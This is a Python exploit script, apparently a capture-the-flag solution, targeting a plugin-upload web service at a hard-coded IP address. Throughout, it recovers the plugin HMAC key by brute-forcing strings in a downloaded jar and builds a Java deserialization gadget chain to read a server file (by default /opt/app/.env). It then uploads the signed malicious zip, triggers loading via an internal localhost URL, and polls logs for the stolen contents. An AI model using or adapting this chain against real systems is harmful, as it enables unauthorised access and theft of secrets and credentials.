#!/usr/bin/env python3
import base64
import hashlib
import hmac
import io
import json
import os
import re
import subprocess
import sys
import tempfile
import time
import uuid
import zipfile
from pathlib import Path
from urllib.parse import urljoin

import requests
 
 
BASE_URL = "http://39.105.213.28:9000"
DEFAULT_TARGET_PATH = "/opt/app/.env"
 
 
JAVA_TEMPLATE = r"""
import java.io.*;
import __PACKAGE__.*;
 
public class GenCurRR {
    public static void main(String[] args) throws Exception {
        String path = args[0];
        String team = args[1];
        String out = args[2];
        FileExporter exporter = new FileExporter(team);
        DataStream ds = new DataStream(path, exporter);
        ResourceRefresher rr = new ResourceRefresher(path);
        rr.setDataStream(ds);
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(out))) {
            oos.writeObject(rr);
        }
    }
}
"""
 
 
def build_metadata(target_path: str, log_team: str, classpath: str, package_name: str) -> bytes:
    with tempfile.TemporaryDirectory() as td:
        src = os.path.join(td, "GenCurRR.java")
        out = os.path.join(td, "metadata.ser")
        with open(src, "w", encoding="utf-8", newline="\n") as f:
            f.write(JAVA_TEMPLATE.replace("__PACKAGE__", package_name))
 
        subprocess.run(
            ["javac", "-cp", classpath, "GenCurRR.java"],
            cwd=td,
            check=True,
            capture_output=True,
        )
        subprocess.run(
            ["java", "-cp", f".{os.pathsep}{classpath}", "GenCurRR", target_path, log_team, out],
            cwd=td,
            check=True,
            capture_output=True,
        )
        with open(out, "rb") as f:
            return f.read()
 
 
def build_zip(metadata: bytes, hmac_key: bytes, sample_manifest: dict) -> bytes:
    sig = base64.b64encode(hmac.new(hmac_key, metadata, hashlib.sha256).digest()).decode()
    manifest = dict(sample_manifest)
    manifest["hmacSignature"] = sig
    manifest["description"] = "cur-rr"
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("manifest.json", json.dumps(manifest))
        zf.writestr("metadata.ser", metadata)
    return buf.getvalue()
 
 
def load_sample_plugin(session: requests.Session) -> tuple[dict, bytes]:
    resp = session.get(urljoin(BASE_URL, "/downloads/sample-plugin.zip"), timeout=30)
    resp.raise_for_status()
    with zipfile.ZipFile(io.BytesIO(resp.content)) as zf:
        manifest = json.loads(zf.read("manifest.json"))
        metadata = zf.read("metadata.ser")
    return manifest, metadata
 
 
def extract_core_classes(session: requests.Session, workdir: str) -> tuple[str, str]:
    jar_path = os.path.join(workdir, "agent-core.jar")
    class_root = os.path.join(workdir, "core_classes")
    resp = session.get(urljoin(BASE_URL, "/downloads/agent-core.jar"), timeout=30)
    resp.raise_for_status()
    with open(jar_path, "wb") as f:
        f.write(resp.content)
 
    prefix = "BOOT-INF/classes/"
    with zipfile.ZipFile(jar_path) as zf:
        for name in zf.namelist():
            if not name.startswith(prefix) or name.endswith("/"):
                continue
            rel = name[len(prefix):]
            target = os.path.join(class_root, *rel.split("/"))
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as f:
                f.write(zf.read(name))
    return jar_path, class_root
 
 
def find_deser_package(class_root: str) -> str:
    required = {"ResourceRefresher.class", "DataStream.class", "FileExporter.class"}
    for root, _, files in os.walk(class_root):
        if required.issubset(set(files)):
            rel = Path(root).relative_to(class_root)
            return ".".join(rel.parts)
    raise RuntimeError("deserialization package not found in agent-core.jar")
 
 
def iter_candidate_keys(jar_path: str):
    preferred = []
    others = []
    with zipfile.ZipFile(jar_path) as zf:
        for name in zf.namelist():
            if not name.endswith(".class"):
                continue
            if re.search(r"(hmac|integrity|valid|plugin)", name, re.IGNORECASE):
                preferred.append(name)
            else:
                others.append(name)
 
        seen = set()
        for name in preferred + others:
            data = zf.read(name)
            for match in re.finditer(rb"[ -~]{4,64}", data):
                candidate = match.group(0).decode("ascii", "ignore")
                if not candidate or any(ch.isspace() for ch in candidate):
                    continue
                if "/" in candidate or "\\" in candidate:
                    continue
                if candidate in seen:
                    continue
                seen.add(candidate)
                yield candidate.encode()
 
 
def extract_hmac_key(jar_path: str, sample_metadata: bytes, expected_sig: str) -> bytes:
    for candidate in iter_candidate_keys(jar_path):
        sig = base64.b64encode(hmac.new(candidate, sample_metadata, hashlib.sha256).digest()).decode()
        if hmac.compare_digest(sig, expected_sig):
            return candidate
    raise RuntimeError("unable to derive HMAC key from agent-core.jar")
 
 
def rand_team(prefix: str) -> str:
    return prefix + uuid.uuid4().hex[:8]
 
 
def exploit(target_path: str) -> str | None:
    session = requests.Session()
    session.trust_env = False
 
    with tempfile.TemporaryDirectory() as td:
        sample_manifest, sample_metadata = load_sample_plugin(session)
        jar_path, class_root = extract_core_classes(session, td)
        package_name = find_deser_package(class_root)
        hmac_key = extract_hmac_key(jar_path, sample_metadata, sample_manifest["hmacSignature"])
 
        host_team = rand_team("host")
        log_team = rand_team("log")
        cfg_team = rand_team("cfg")
 
        metadata = build_metadata(target_path, log_team, class_root, package_name)
        zip_bytes = build_zip(metadata, hmac_key, sample_manifest)
 
        session.get(BASE_URL + "/", timeout=10)
        time.sleep(2)
 
        upload = session.post(
            BASE_URL + "/api/upload",
            files={"file": ("exploit.zip", zip_bytes, "application/zip")},
            data={"team_id": host_team},
            timeout=20,
        )
        print("[upload]", upload.status_code, upload.text)
        upload.raise_for_status()
 
        time.sleep(2)
        dl_path = upload.json()["download_url"]
        internal_url = "http://localhost:8080" + dl_path
        trigger = session.post(
            BASE_URL + "/api/config/update_url",
            params={"team_id": cfg_team, "url": internal_url},
            timeout=20,
        )
        print("[trigger]", trigger.status_code, trigger.text)
        trigger.raise_for_status()
 
        for i in range(18):
            time.sleep(5)
            try:
                logs = session.get(BASE_URL + "/api/logs", params={"team_id": log_team}, timeout=10)
            except requests.RequestException as exc:
                print(f"[logs {i}] request failed: {exc}")
                continue
            print(f"[logs {i}]", logs.status_code, logs.text[:1000])
            m = re.search(r"ISCC\{[^}]+\}", logs.text)
            if m:
                return m.group(0)
    return None
 
 
def main():
    target_path = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET_PATH
    flag = exploit(target_path)
    if flag:
        print("[flag]", flag)
    else:
        print("[!] flag not found")
 
 
if __name__ == "__main__":
    main()
